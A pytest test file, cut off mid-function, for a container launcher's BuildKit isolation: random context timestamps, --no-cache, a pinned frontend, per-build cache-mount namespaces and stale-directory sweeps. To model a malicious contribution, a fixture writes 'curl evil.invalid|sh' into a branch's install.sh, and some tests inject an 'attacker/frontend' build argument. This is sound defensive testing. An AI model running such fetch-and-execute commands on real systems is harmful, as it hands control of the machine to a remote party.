"""No build consumes what another build left in BuildKit, and a repository
image's build directory lives only as long as its launch (DESIGN §6 *No
build consumes what another build left in BuildKit*, *A repository image's
build directory lives only as long as its launch*; review round 34,
isolation R1, R2 and its observation, and execution R34E-1).

R1: BuildKit keeps one snapshot of the build context for every nerdctl
build and skips a file whose size, mode, owner and time match, without
reading it. `git archive` dated every context file at the commit's
committer time, so a contributor's branch, its commit dated at the trusted
HEAD's time and each copied file the same size, put its bytes in the
trusted branch's worker root. `_repo_context_retime` dates a context at one
random moment instead. R2 and the observation: a step's cache key leaves
out a proxy a frontend can set, and cache mounts are shared by id, so every
build leerie runs is given `--no-cache`. R34E-1: a SIGTERM or SIGHUP during
the build left the ~1 GB OCI layout behind for good.

Review round 35. I1: `--no-cache` reaches BuildKit only as an option of the
frontend, so a repository's `# syntax=` frontend that dropped it read what
another repository's build left in a cache mount; every build is now given
leerie's pinned frontend (`LEERIE_DOCKERFILE_FRONTEND`, DESIGN §6 *A
repository's parser directives are its own build's; its frontend is
leerie's*), pulled into BuildKit's namespace first. R35E-2: a SIGTERM to the
launcher's PID alone left the build running to write the directory again;
no build now outlives its launch. Claims R1: every `$STAGE` EXIT trap calls
`_repo_build_done`.

Review round 37. I3: a build resolves a name the registry refuses from the
image store of the containerd namespace BuildKit's worker reads, where
leerie tagged every repository image, so one repository's Dockerfile read
another's worker root by naming it; leerie's images and containers are now
in a namespace of its own, `LEERIE_IMAGE_NS`, which a repository build
refuses to run beside (`leerie_buildkit_check`), and the images an earlier
leerie left where the worker reads are swept. I4: a repository's build
pulled with the operator's registry credentials; it is given an empty
Docker config.

The unit tests run the launcher's own text. With
`LEERIE_TEST_BUILDKIT_ISOLATION=1` (a rootless host with nerdctl, buildkitd
and containerd-rootless-setuptool.sh) the real builds run too, on a
BuildKit daemon and containerd namespace the test starts and removes, never
the operator's: the two-branch reproduction through `build_repo_image`, a
cache mount another repository's build planted, leerie's base build after a
build that ran its step through a proxy, a hostile `# syntax=` frontend
reading another repository's cache mount, the pulled frontend building
with the daemon's registry cut, another repository's image named by a
`FROM` and a bind mount, the refusal and the sweep on the real namespace,
and a registry credential in the operator's Docker config."""
from __future__ import annotations

import base64
import hashlib
import json
import os
import pty
import re
import secrets
import select
import shutil
import signal
import subprocess
import sys
import termios
import time
from datetime import datetime
from pathlib import Path

import pytest

from tests.conftest import (BUILDCTL_STUB, FRONTEND_SH_SOURCE, LOG_SH_SOURCE,
                            run_git_out)
from tests.repo_image_block_extract import (NERDCTL_IMAGE_INSPECT_STUB,
                                            extract_block,
                                            repo_build_functions)
from tests.test_build_push_modes import _run as _build_push

REPO_ROOT = Path(__file__).resolve().parent.parent
LAUNCHER = REPO_ROOT / "leerie"
COMMIT_TIME = "2026-10-01T12:00:00Z"
COMMIT_NS = int(datetime.fromisoformat(
    COMMIT_TIME.replace("Z", "+00:00")).timestamp()) * 10**9
BASE_BLOCK = ("# --- build image if not present",
              "# --- per-repo derived image (local nerdctl)")
FRONTEND_SH = REPO_ROOT / "scripts" / "dockerfile-frontend.sh"
BUILD_PUSH = REPO_ROOT / "scripts" / "remote" / "build-push.sh"


def _frontend() -> str:
    """LEERIE_DOCKERFILE_FRONTEND, as the one file that sets it says."""
    return re.search(r'^LEERIE_DOCKERFILE_FRONTEND="([^"]+)"$',
                     FRONTEND_SH.read_text(), re.M).group(1)


def _pinned(build: str) -> bool:
    """The recorded argv names leerie's frontend, and no other."""
    return (build.count("BUILDKIT_SYNTAX=") == 1
            and f"--build-arg BUILDKIT_SYNTAX={_frontend()} " in build)


def _text() -> str:
    return LAUNCHER.read_text()


# A recorded `nerdctl` call that is a build: the launcher's and
# `build-push.sh --local-build`'s, in leerie's containerd namespace, and
# Fly's remote `flyctl deploy`.
def _is_build(line: str) -> bool:
    return line.startswith(("--namespace leerie build ", "build ",
                            "deploy "))


# A build of leerie's in its own namespace, on the daemon
# leerie_buildkit_check vetted, given `--no-cache` (DESIGN §6 *No build
# consumes what another build left in BuildKit*).
_LEERIE_BUILD = re.compile(
    r"--namespace leerie build --buildkit-host unix://\S+ --no-cache ")


def _fns() -> str:
    return repo_build_functions(_text())


def _launcher_fn(name: str) -> str:
    text = _text()
    fn = text[text.index(f"{name}() {{"):]
    return fn[:fn.index("\n}\n") + 3]


def _in_repo(repo: Path, *args: str, date: str | None = None) -> None:
    env = {"PATH": "/usr/bin:/bin", "HOME": str(repo.parent)}
    if date:
        env["GIT_COMMITTER_DATE"] = env["GIT_AUTHOR_DATE"] = date
    run_git_out(repo, *args, env=env,
                config=("user.email=t@t.invalid", "user.name=t"))


def _two_branch_repo(root: Path, dockerfile: str) -> Path:
    """main holds `install.sh` (26 bytes); `contrib` holds other bytes of
    the same size, its commit dated at main's committer time."""
    repo = root / "repo"
    repo.mkdir(parents=True)
    _in_repo(repo, "init", "-q", "-b", "main")
    (repo / ".leerie").mkdir()
    (repo / ".leerie" / "Dockerfile").write_text(dockerfile)
    (repo / "install.sh").write_text("echo trusted-install-main\n")
    os.symlink("install.sh", repo / "link")
    _in_repo(repo, "add", "-A")
    _in_repo(repo, "commit", "-qm", "main", date=COMMIT_TIME)
    _in_repo(repo, "checkout", "-q", "-b", "contrib")
    (repo / "install.sh").write_text("curl evil.invalid|sh #xyz\n")
    _in_repo(repo, "commit", "-qam", "contrib", date=COMMIT_TIME)
    _in_repo(repo, "checkout", "-q", "main")
    return repo


# --- R1: the context is dated at one random moment ---------------------------

_STAT = r'''
python3 -I -S - "$_REPO_BUILD_CTX" <<'PY'
import os, sys
root = sys.argv[1]
print("ROOT", os.lstat(root).st_mtime_ns)
for d, dirs, files in os.walk(root):
    for n in sorted(dirs + files):
        p = os.path.join(d, n)
        print(os.path.relpath(p, root), os.lstat(p).st_mtime_ns)
PY
'''


def _prepare(repo: Path, state: Path) -> tuple[str, dict[str, int]]:
    script = ("set -euo pipefail\n" + 'remote_log() { echo "$*" >&2; }\n'
              + _fns() + "\n_repo_image_prepare\n"
              'echo "CTX $_REPO_CTX_SHA"\n' + _STAT + "_repo_build_done\n")
    state.mkdir(parents=True, exist_ok=True)
    r = subprocess.run(["bash", "-c", script], capture_output=True,
                       text=True, timeout=60,
                       env={"PATH": "/usr/bin:/bin", "USER_REPO": str(repo),
                            "LEERIE_STATE_HOST_DIR": str(state)})
    assert r.returncode == 0, r.stderr
    sha = re.search(r"^CTX (\w+)$", r.stdout, re.M).group(1)
    times = dict(re.findall(r"^(\S+) (\d+)$", r.stdout, re.M))
    return sha, {k: int(v) for k, v in times.items()}


def test_a_context_is_dated_at_one_moment_no_committer_chose(tmp_path):
    """Every entry (the root, a file, a committed link itself) carries one
    time, in the past year and not the commit's; two exports of the same
    commit carry different times and the same key. Falsified: without
    `_repo_context_retime` each entry carries the commit time (fails)."""
    repo = _two_branch_repo(
        tmp_path, "FROM scratch\nCOPY install.sh link /\n")
    sha1, t1 = _prepare(repo, tmp_path / "s1")
    sha2, t2 = _prepare(repo, tmp_path / "s2")
    assert set(t1) == {"ROOT", "install.sh", "link"}, t1
    assert COMMIT_NS == 1790856000 * 10**9
    assert len(set(t1.values())) == 1 and len(set(t2.values())) == 1
    a, b = t1["ROOT"], t2["ROOT"]
    assert a != b and COMMIT_NS not in (a, b)
    now = time.time_ns()
    assert all(now - 366 * 86400 * 10**9 < x < now for x in (a, b))
    assert sha1 == sha2


# --- R2 and the observation: every build is given --no-cache -----------------

_RECORD = r'''
nerdctl() {
  echo "$*" >> "$NERDCTL_LOG"
  [ "${1:-}" = "--namespace" ] && shift 2
  local _c="${1:-}"; shift || true
  case "$_c" in
    image) _stub_image_inspect "$@" && return 0; return "${NERDCTL_INSPECT_RC:-1}" ;;
    build) _stub_build_done "$@"; return 0 ;;
  esac
  return 0
}
'''


def _record(tmp_path: Path, body: str, env: dict[str, str]) -> list[str]:
    log = tmp_path / "nerdctl.log"
    script = ("set -euo pipefail\n" + LOG_SH_SOURCE + FRONTEND_SH_SOURCE
              + BUILDCTL_STUB + 'remote_log() { echo "$*" >&2; }\n'
              + NERDCTL_IMAGE_INSPECT_STUB + _RECORD + body)
    r = subprocess.run(["bash", "-c", script], capture_output=True,
                       text=True, timeout=120,
                       env={"PATH": "/usr/bin:/bin", "TMPDIR": str(tmp_path),
                            "NERDCTL_LOG": str(log), **env})
    assert r.returncode == 0, r.stderr
    return [line for line in log.read_text().splitlines()
            if _is_build(line)]


def test_leeries_base_build_reuses_no_cache(tmp_path):
    """The base build, which runs when the version's image is absent, after
    the frontend is pulled into BuildKit's namespace. Falsified: without
    `--no-cache` there (fails); without the frontend there (fails); without
    the pull before it (fails)."""
    state = tmp_path / "state"
    state.mkdir()
    builds = _record(tmp_path, "_repo_build_done() { :; }\n"
                     + extract_block(_text(), *BASE_BLOCK), {
        "IMAGE_TAG": "leerie:9.9.9", "LEERIE_REPO": str(tmp_path),
        "LEERIE_STATE_HOST_DIR": str(state)})
    assert len(builds) == 1 and "-t leerie:9.9.9" in builds[0], builds
    assert _LEERIE_BUILD.match(builds[0]), builds
    assert _pinned(builds[0]), builds
    calls = (tmp_path / "nerdctl.log").read_text().splitlines()
    pull = f"--namespace default pull -q {_frontend()}"
    assert pull in calls and calls.index(pull) < calls.index(builds[0]), \
        calls


def test_both_builds_of_a_repository_image_reuse_no_cache(tmp_path):
    """Both are given `--no-cache` and leerie's frontend. Falsified:
    `--no-cache` dropped from either build (fails); the frontend dropped
    from either (fails)."""
    repo = _two_branch_repo(tmp_path, "FROM scratch\nCOPY install.sh /\n")
    state = tmp_path / "state"
    state.mkdir()
    builds = _record(tmp_path, _fns() + _launcher_fn("build_repo_image")
                     + "\n_repo_image_prepare\nbuild_repo_image r:1\n"
                     "_repo_build_done\n",
                     {"IMAGE_TAG": "leerie:9.9.9", "USER_REPO": str(repo),
                      "LEERIE_STATE_HOST_DIR": str(state)})
    assert len(builds) == 2, builds
    assert all(_LEERIE_BUILD.match(b) for b in builds), builds
    assert all(_pinned(b) for b in builds), builds


def test_the_generated_files_builds_reuse_no_cache(tmp_path):
    """Leerie's generated file is built by `build_repo_image` alone (review
    round 35, execution R35E-1), and so is its fallback: when the
    language-dep layer does not build, all three builds are given
    `--no-cache` and leerie's frontend, pulled before them. Falsified:
    either dropped from `build_repo_image`'s first build (fails); the pull
    dropped from the build decision (fails)."""
    from tests.test_build_repo_image import (_generate_dockerfile,
                                             _write_config_toml)
    user_repo = tmp_path / "repo"
    (user_repo / ".leerie").mkdir(parents=True)
    _write_config_toml(user_repo / ".leerie")
    (user_repo / "uv.lock").write_text("")
    (user_repo / "pyproject.toml").write_text('[project]\nname = "x"\n')
    state = tmp_path / "state"
    state.mkdir()
    r = _generate_dockerfile(tmp_path, user_repo, state,
                             {"NERDCTL_FAIL_LANG_LAYER": "1"})
    assert r.returncode == 0, r.stderr
    builds = [line for line in (tmp_path / "nerdctl.log").read_text()
              .splitlines() if _is_build(line)]
    assert len(builds) == 3, builds
    assert all(_LEERIE_BUILD.match(b) for b in builds), builds
    assert all(_pinned(b) for b in builds), builds
    calls = (tmp_path / "nerdctl.log").read_text().splitlines()
    pull = f"--namespace default pull -q {_frontend()}"
    assert pull in calls and calls.index(pull) < calls.index(builds[0]), \
        calls


@pytest.mark.parametrize("mode", ["remote", "local"])
def test_build_push_reuses_no_cache_on_either_builder(tmp_path, mode):
    """Fly's remote builder is one per organization; `--local-build` is
    the host's BuildKit. Falsified: `--no-cache` dropped from either
    (fails for that builder)."""
    args = ["--app", "testapp", "--push"]
    if mode == "local":
        args.append("--local-build")
    r = _build_push(tmp_path, *args)
    assert r.returncode == 0, r.stderr
    if mode == "remote":
        log = (tmp_path / "flyctl.log").read_text()
        assert "deploy --build-only --push --remote-only --depot=false " \
               "--no-cache " in log, log
        assert _pinned(log), log
    else:
        log = (tmp_path / "nerdctl.log").read_text()
        builds = [x for x in log.splitlines() if _is_build(x)]
        assert builds and all(_LEERIE_BUILD.match(b) for b in builds), log
        assert all(_pinned(b) for b in builds), log


@pytest.mark.parametrize("mode", ["remote", "local"])
def test_build_push_takes_no_frontend_from_its_caller(tmp_path, mode):
    """A caller's `--build-arg BUILDKIT_SYNTAX=…` is refused before any
    build. Falsified: the refusal removed (rc 0, the caller's frontend
    given after leerie's)."""
    args = ["--app", "testapp", "--push", "--build-arg",
            "BUILDKIT_SYNTAX=attacker/frontend:1"]
    if mode == "local":
        args.append("--local-build")
    r = _build_push(tmp_path, *args)
    assert r.returncode == 1 and "BUILDKIT_SYNTAX" in r.stderr, r.stderr
    for log in ("flyctl.log", "nerdctl.log"):
        p = tmp_path / log
        assert not p.exists() or "attacker/frontend" not in p.read_text()


# --- review round 35, isolation I1: the frontend is leerie's ----------------

def test_the_frontend_is_one_pinned_digest():
    """`docker/dockerfile:1`, pinned by the digest of its image index."""
    assert re.fullmatch(r"docker/dockerfile:1@sha256:[0-9a-f]{64}",
                        _frontend())


def _commands(text: str) -> list[str]:
    """The text's commands, each with its continuation lines joined; comment
    lines dropped."""
    out, cur = [], ""
    for line in text.splitlines():
        if line.lstrip().startswith("#"):
            continue
        cur += line.rstrip("\\") + " "
        if not line.endswith("\\"):
            out.append(cur)
            cur = ""
    return out


# A build site of the launcher's: in leerie's containerd namespace.
_LAUNCHER_BUILD = r'\bnerdctl --namespace "\$LEERIE_IMAGE_NS" build\b'


def test_every_build_site_is_given_the_pinned_frontend():
    """Derived from the build sites themselves: every `nerdctl build` the
    launcher runs names `BUILDKIT_SYNTAX="$LEERIE_DOCKERFILE_FRONTEND"`,
    and every build `build-push.sh` runs passes `build_arg_flags`, which
    each builder starts with the pin. The counts are the converse: a build
    site this scan cannot see would leave them short. Falsified: the
    argument dropped from any one launcher site, or from either builder's
    `build_arg_flags` (fails)."""
    pin = '--build-arg BUILDKIT_SYNTAX="$LEERIE_DOCKERFILE_FRONTEND"'
    launcher = [c for c in _commands(_text())
                if re.search(_LAUNCHER_BUILD, c)]
    assert len(launcher) == 3, launcher
    for c in launcher:
        assert pin in c, c
    bp = _commands(BUILD_PUSH.read_text())
    builds = [c for c in bp if re.search(
        r'\bflyctl deploy\b|"\$build_cmd" "\$\{ns_flags\[@\]\+'
        r'"\$\{ns_flags\[@\]\}"\}" build\b', c)]
    assert len(builds) == 2, builds
    for c in builds:
        assert '"${build_arg_flags[@]+"${build_arg_flags[@]}"}"' in c, c
    inits = [c.strip() for c in bp if "local build_arg_flags=" in c]
    assert len(inits) == 2, inits
    for c in inits:
        assert c.startswith('local build_arg_flags=(--build-arg '
                            '"BUILDKIT_SYNTAX=$LEERIE_DOCKERFILE_FRONTEND" '), c


# --- review round 36, isolation I2: a cache-mount namespace per build -------

_NS = re.compile(r"--build-arg BUILDKIT_CACHE_MOUNT_NS=(\S*)")


def _namespaces(log: str) -> list[str]:
    """Every cache-mount namespace a recorded build was given, in order;
    each recorded build must name exactly one."""
    builds = [x for x in log.splitlines() if _is_build(x)]
    out = []
    for b in builds:
        found = _NS.findall(b)
        assert len(found) == 1, b
        out.append(found[0])
    return out


def test_every_build_site_is_given_a_cache_mount_namespace_of_its_own():
    """Derived from the build sites themselves, as the frontend's pin is:
    every `nerdctl build` the launcher runs names
    `--build-arg BUILDKIT_CACHE_MOUNT_NS="$<var>"`, and that variable is
    assigned from `leerie_cache_mount_ns` in the same function, with its
    failure handled, before the build; every build `build-push.sh` runs
    passes `build_arg_flags`, whose two initialisations both name it. The
    counts are the converse. Falsified: the argument dropped from any one
    launcher site, or from either builder (fails)."""
    text = _text()
    cmds = _commands(text)
    launcher = [c for c in cmds if re.search(_LAUNCHER_BUILD, c)]
    assert len(launcher) == 3, launcher
    for c in launcher:
        m = re.search(r'--build-arg BUILDKIT_CACHE_MOUNT_NS="\$(\w+)"', c)
        assert m, c
        draw = (f'{m.group(1)}="$(leerie_cache_mount_ns)" ')
        assert any(x.startswith(draw) and "||" in x for x in
                   (y.strip() for y in cmds)), (m.group(1), c)
    bp = _commands(BUILD_PUSH.read_text())
    inits = [c.strip() for c in bp if "local build_arg_flags=" in c]
    assert len(inits) == 2, inits
    for c in inits:
        assert '--build-arg "BUILDKIT_CACHE_MOUNT_NS=$ns"' in c, c
    draws = [c.strip() for c in bp if c.strip().startswith(
        'ns="$(leerie_cache_mount_ns)" ||')]
    assert len(draws) == 2, draws


def test_every_build_draws_a_fresh_cache_mount_namespace(tmp_path):
    """Run, not read: the base build, both builds of a repository image, the
    generated file's three (its fallback's included), and `build-push.sh`'s
    builds on either builder, each run twice. Every one is given exactly
    one `leerie-<32 hex>` namespace, and no two are given the same.
    Falsified: one value drawn once per launch and reused for every build
    (fails: repeated); the argument dropped from the generated file's path
    (fails: none)."""
    from tests.test_build_repo_image import (_generate_dockerfile,
                                             _write_config_toml)
    seen: list[str] = []
    st = tmp_path / "base"
    st.mkdir()
    _record(st, "_repo_build_done() { :; }\n"
            + extract_block(_text(), *BASE_BLOCK), {
                "IMAGE_TAG": "leerie:9.9.9", "LEERIE_REPO": str(tmp_path),
                "LEERIE_STATE_HOST_DIR": str(st)})
    seen += _namespaces((st / "nerdctl.log").read_text())
    rp = tmp_path / "rp"
    repo = _two_branch_repo(rp, "FROM scratch\nCOPY install.sh /\n")
    (rp / "state").mkdir()
    _record(rp, _fns() + _launcher_fn("build_repo_image")
            + "\n_repo_image_prepare\nbuild_repo_image r:1\n"
            "_repo_build_done\n",
            {"IMAGE_TAG": "leerie:9.9.9", "USER_REPO": str(repo),
             "LEERIE_STATE_HOST_DIR": str(rp / "state")})
    seen += _namespaces((rp / "nerdctl.log").read_text())
    gen = tmp_path / "gen"
    user_repo = gen / "repo"
    (user_repo / ".leerie").mkdir(parents=True)
    _write_config_toml(user_repo / ".leerie")
    (user_repo / "uv.lock").write_text("")
    (user_repo / "pyproject.toml").write_text('[project]\nname = "x"\n')
    (gen / "state").mkdir()
    r = _generate_dockerfile(gen, user_repo, gen / "state",
                             {"NERDCTL_FAIL_LANG_LAYER": "1"})
    assert r.returncode == 0, r.stderr
    seen += _namespaces((gen / "nerdctl.log").read_text())
    for mode in ("remote", "local"):
        for i in range(2):
            d = tmp_path / f"bp-{mode}-{i}"
            d.mkdir()
            args = ["--app", "testapp", "--push"]
            if mode == "local":
                args.append("--local-build")
            r = _build_push(d, *args)
            assert r.returncode == 0, r.stderr
            log = "flyctl.log" if mode == "remote" else "nerdctl.log"
            seen += _namespaces((d / log).read_text())
    assert len(seen) == 1 + 2 + 3 + 4, seen
    assert all(re.fullmatch(r"leerie-[0-9a-f]{32}", x) for x in seen), seen
    assert len(set(seen)) == len(seen), seen


_PRUNE = re.compile(r'prune --filter type==exec\.cachemount,'
                    r'description~="(leerie-[0-9a-f]{32})/"$')


def _pruned(log: Path) -> list[str]:
    return [m.group(1) for line in log.read_text().splitlines()
            if (m := _PRUNE.search(line))] if log.exists() else []


def test_every_build_prunes_its_own_cache_mount_records(tmp_path):
    """Run: the base build, both of `build_repo_image`'s, and
    `build-push.sh --local-build`'s, each followed by a prune of exactly
    the cache-mount records its own namespace names, on the daemon it ran
    on, whatever the build's status (review round 37, execution E4).
    Falsified (2026-11-03): the prune dropped from the wrap build, or given
    the other build's namespace (fails)."""
    st = tmp_path / "base"
    st.mkdir()
    blog = tmp_path / "buildctl-base.log"
    _record(st, "_repo_build_done() { :; }\n"
            + extract_block(_text(), *BASE_BLOCK), {
                "IMAGE_TAG": "leerie:9.9.9", "LEERIE_REPO": str(tmp_path),
                "LEERIE_STATE_HOST_DIR": str(st), "BUILDCTL_LOG": str(blog)})
    assert _pruned(blog) == _namespaces((st / "nerdctl.log").read_text())
    assert len(_pruned(blog)) == 1
    rp = tmp_path / "rp"
    repo = _two_branch_repo(rp, "FROM scratch\nCOPY install.sh /\n")
    (rp / "state").mkdir()
    rlog = tmp_path / "buildctl-repo.log"
    _record(rp, _fns() + _launcher_fn("build_repo_image")
            + "\n_repo_image_prepare\nbuild_repo_image r:1\n"
            "_repo_build_done\n",
            {"IMAGE_TAG": "leerie:9.9.9", "USER_REPO": str(repo),
             "LEERIE_STATE_HOST_DIR": str(rp / "state"),
             "BUILDCTL_LOG": str(rlog)})
    ns = _namespaces((rp / "nerdctl.log").read_text())
    assert len(ns) == 2 and _pruned(rlog) == ns, (ns, _pruned(rlog))
    host = [line.split()[1] for line in rlog.read_text().splitlines()
            if " prune " in line]
    assert host and all(h.startswith("unix://") for h in host), host
    bp = tmp_path / "bp"
    bp.mkdir()
    r = _build_push(bp, "--app", "testapp", "--push", "--local-build")
    assert r.returncode == 0, r.stderr
    assert _pruned(bp / "buildctl.log") == _namespaces(
        (bp / "nerdctl.log").read_text()), r.stderr

def test_the_base_builds_failed_prune_warns(tmp_path):
    """Review round 38, claims F3: the base build's prune warns when it
    fails, naming the namespace, as `build_repo_image`'s and
    `build-push.sh`'s do (DESIGN §6 *Residuals*: "A failed prune warns").
    Falsified live (2026-11-03): the warning replaced by `|| true` again
    (no warning)."""
    log = tmp_path / "nerdctl.log"
    script = ("set -euo pipefail\n" + LOG_SH_SOURCE + FRONTEND_SH_SOURCE
              + BUILDCTL_STUB + 'remote_log() { echo "$*" >&2; }\n'
              + NERDCTL_IMAGE_INSPECT_STUB + _RECORD
              + "leerie_prune_cache_mounts() { return 1; }\n"
              + "_repo_build_done() { :; }\n"
              + extract_block(_text(), *BASE_BLOCK))
    r = subprocess.run(["bash", "-c", script], capture_output=True,
                       text=True, timeout=120,
                       env={"PATH": "/usr/bin:/bin", "TMPDIR": str(tmp_path),
                            "NERDCTL_LOG": str(log), "IMAGE_TAG": "leerie:9.9.9",
                            "LEERIE_REPO": str(tmp_path),
                            "LEERIE_STATE_HOST_DIR": str(tmp_path)})
    assert r.returncode == 0, r.stderr
    ns = _namespaces(log.read_text())
    assert len(ns) == 1, ns
    assert ("warning: could not remove the build's cache-mount records "
            f"({ns[0]})") in r.stderr, r.stderr


def test_no_build_runs_without_a_namespace(tmp_path):
    """`leerie_cache_mount_ns` prints nothing and returns 1 when it reads no
    random bytes, and a build that cannot draw one does not run: an empty
    value would be one namespace every such build shares. Falsified: the
    `||` guard on `build_repo_image`'s first draw removed (a build runs
    with `BUILDKIT_CACHE_MOUNT_NS=`); the length check removed from the
    helper (it prints `leerie-`)."""
    no_od = "od() { return 0; }\n"
    r = subprocess.run(
        ["bash", "-c", "set -euo pipefail\n" + FRONTEND_SH_SOURCE + no_od
         + 'if v="$(leerie_cache_mount_ns)"; then echo "GOT[$v]"; '
         'else echo "FAILED[$v]"; fi\n'],
        capture_output=True, text=True, timeout=60,
        env={"PATH": "/usr/bin:/bin"})
    assert r.stdout == "FAILED[]\n", (r.stdout, r.stderr)
    repo = _two_branch_repo(tmp_path, "FROM scratch\nCOPY install.sh /\n")
    state = tmp_path / "state"
    state.mkdir()
    log = tmp_path / "nerdctl.log"
    script = ("set -euo pipefail\n" + LOG_SH_SOURCE + FRONTEND_SH_SOURCE
              + 'remote_log() { echo "$*" >&2; }\n'
              + BUILDCTL_STUB + NERDCTL_IMAGE_INSPECT_STUB + _RECORD + _fns()
              + _launcher_fn("build_repo_image")
              + "\n_repo_image_prepare\n" + no_od
              + "build_repo_image r:1\n")
    r = subprocess.run(["bash", "-c", script], capture_output=True,
                       text=True, timeout=120,
                       env={"PATH": "/usr/bin:/bin", "TMPDIR": str(tmp_path),
                            "NERDCTL_LOG": str(log), "IMAGE_TAG": "l:9",
                            "USER_REPO": str(repo),
                            "LEERIE_STATE_HOST_DIR": str(state)})
    assert r.returncode == 1, r.stderr
    assert "could not draw a cache-mount namespace" in r.stderr, r.stderr
    assert not log.exists() or not any(
        _is_build(x) for x in log.read_text().splitlines())


@pytest.mark.parametrize("mode", ["remote", "local"])
@pytest.mark.parametrize("spelling", [
    ["--build-arg", "BUILDKIT_CACHE_MOUNT_NS=shared"],
    ["--build-arg=BUILDKIT_CACHE_MOUNT_NS=shared"],
    ["--build-arg", "BUILDKIT_CACHE_MOUNT_NS"],
    ["--build-arg", "buildkit_cache_mount_ns=shared"],
    ["--build-arg", "buildkit_syntax=attacker/frontend:1"],
    ["--build-arg", "Buildkit_Syntax"]])
def test_build_push_takes_no_namespace_or_frontend_in_any_case(
        tmp_path, mode, spelling):
    """A caller cannot name the cache-mount namespace (it would share one
    with another build), nor, in another letter case, the frontend: each
    spelling is refused before any build. Falsified: the namespace dropped
    from the refusal (its cases exit 0); `nocasematch` dropped (the
    lower- and mixed-case ones exit 0)."""
    args = ["--app", "testapp", "--push", *spelling]
    if mode == "local":
        args.append("--local-build")
    r = _build_push(tmp_path, *args)
    assert r.returncode == 1 and "refusing" in r.stderr, r.stderr
    for log in ("flyctl.log", "nerdctl.log"):
        p = tmp_path / log
        assert not p.exists() or not any(
            _is_build(x) for x in
            p.read_text().splitlines())


@pytest.mark.parametrize("mode", ["remote", "local"])
def test_build_push_leaves_no_file_when_it_cannot_draw_a_namespace(
        tmp_path, mode):
    """With no random bytes (an `od` that fails), either builder refuses
    before any build and leaves nothing in $TMPDIR: the remote builder's
    temporary fly.toml is made only after the draw (review round 37,
    execution E3). Falsified (2026-11-03): the draw after the `mktemp`
    leaves `leerie-build.*.toml`."""
    tmpdir = tmp_path / "tmp"
    tmpdir.mkdir()
    od = tmp_path / "od"
    od.write_text("#!/bin/sh\nexit 1\n")
    od.chmod(0o755)
    args = ["--app", "testapp", "--push"]
    if mode == "local":
        args.append("--local-build")
    r = _build_push(tmp_path, *args, env_extra={"TMPDIR": str(tmpdir)})
    assert r.returncode == 1, r.stderr
    assert "could not draw a cache-mount namespace" in r.stderr, r.stderr
    assert list(tmpdir.iterdir()) == []
    for log in ("flyctl.log", "nerdctl.log"):
        p = tmp_path / log
        assert not p.exists() or not any(
            _is_build(x) for x in p.read_text().splitlines())

_PULL_STUB = r'''
nerdctl() {
  echo "$*" >> "$NERDCTL_LOG"
  case "$*" in
    "--namespace default image inspect "*) return "${INSPECT_RC:-1}" ;;
    "--namespace default pull "*) return "${PULL_RC:-0}" ;;
  esac
  return 9
}
'''


@pytest.mark.parametrize("inspect_rc,pull_rc,pulled,warned", [
    (0, 0, False, False), (1, 0, True, False), (1, 1, True, True)])
def test_the_frontend_is_pulled_into_the_workers_namespace(
        tmp_path, inspect_rc, pull_rc, pulled, warned):
    """`ensure_frontend_in_worker_ns`: pulled into the namespace BuildKit's
    worker reads (`default` here, from `buildctl debug workers`) unless
    there already; a failed pull warns and goes on. Falsified: the pull
    removed (fails the absent cases)."""
    log = tmp_path / "nerdctl.log"
    r = subprocess.run(
        ["bash", "-c", "set -euo pipefail\n" + LOG_SH_SOURCE
         + FRONTEND_SH_SOURCE + BUILDCTL_STUB + _PULL_STUB
         + "ensure_frontend_in_worker_ns\necho OK\n"],
        capture_output=True, text=True, timeout=60,
        env={"PATH": "/usr/bin:/bin", "NERDCTL_LOG": str(log),
             "INSPECT_RC": str(inspect_rc), "PULL_RC": str(pull_rc)})
    assert r.returncode == 0 and r.stdout == "OK\n", r.stderr
    calls = log.read_text().splitlines()
    assert calls[0] == f"--namespace default image inspect {_frontend()}"
    assert (f"--namespace default pull -q {_frontend()}" in calls) is pulled
    assert ("could not pull the Dockerfile frontend" in r.stderr) is warned


# --- R34E-1: the build directory lives only as long as its launch -----------

def test_a_build_directory_is_named_for_its_launcher(tmp_path):
    """Falsified: the old `b.XXXXXX` name (fails)."""
    script = ('remote_log() { :; }\n' + _fns()
              + '\n_repo_build_dir\necho "$$ ${_REPO_BUILD_DIR##*/}"\n'
              "_repo_build_done\n")
    r = subprocess.run(["bash", "-c", script], capture_output=True,
                       text=True, timeout=60,
                       env={"PATH": "/usr/bin:/bin",
                            "LEERIE_STATE_HOST_DIR": str(tmp_path)})
    pid, name = r.stdout.split()
    assert re.fullmatch(rf"b\.{pid}\.\w{{6}}", name), name


def _dead_pid() -> int:
    return int(Path("/proc/sys/kernel/pid_max").read_text()) + 1


def _age(p: Path, days: int) -> None:
    t = time.time() - days * 86400
    os.utime(p, (t, t), follow_symlinks=False)


def test_the_sweep_removes_what_a_finished_launch_left(tmp_path):
    """A dead launcher's entry (a directory, a file, a link, whose target
    survives) goes at once; a live launcher's stays unless untouched for a
    day; a name with no PID goes only after a day. Falsified: the sweep
    absent (fails), the PID test dropped (fails on the dead ones), the age
    test dropped (fails on the old ones)."""
    ib = tmp_path / ".image-build"
    ib.mkdir()
    dead, live = _dead_pid(), os.getpid()
    outside = tmp_path / "outside"
    outside.write_text("keep\n")
    (ib / f"b.{dead}.aaaaaa").mkdir()
    (ib / f"b.{dead}.aaaaaa" / "worker").mkdir()
    (ib / f"b.{dead}.ffffff").write_text("")
    os.symlink(outside, ib / f"b.{dead}.llllll")
    (ib / f"b.{live}.bbbbbb").mkdir()
    (ib / f"b.{live}.eeeeee").mkdir()
    _age(ib / f"b.{live}.eeeeee", 2)
    (ib / "b.cccccc").mkdir()
    (ib / "b.dddddd").mkdir()
    _age(ib / "b.dddddd", 2)
    r = subprocess.run(["bash", "-c", _launcher_fn("_sweep_stale_builds")
                        + "\n_sweep_stale_builds\n"],
                       capture_output=True, text=True, timeout=60,
                       env={"PATH": "/usr/bin:/bin",
                            "LEERIE_STATE_HOST_DIR": str(tmp_path)})
    assert r.returncode == 0, r.stderr
    assert sorted(p.name for p in ib.iterdir()) == [
        f"b.{live}.bbbbbb", "b.cccccc"]
    assert outside.read_text() == "keep\n"


def test_every_launch_sweeps_before_it_builds(tmp_path):
    """The launcher's own text after the base build starts the sweep.
    Falsified: the call removed (fails)."""
    ib = tmp_path / ".image-build"
    ib.mkdir()
    (ib / f"b.{_dead_pid()}.aaaaaa").mkdir()
    block = extract_block(_text(), "# --- a repository image's build",
                          BASE_BLOCK[1])
    subprocess.run(["bash", "-c", "_repo_build_done() { :; }\n" + block],
                   check=True, timeout=60,
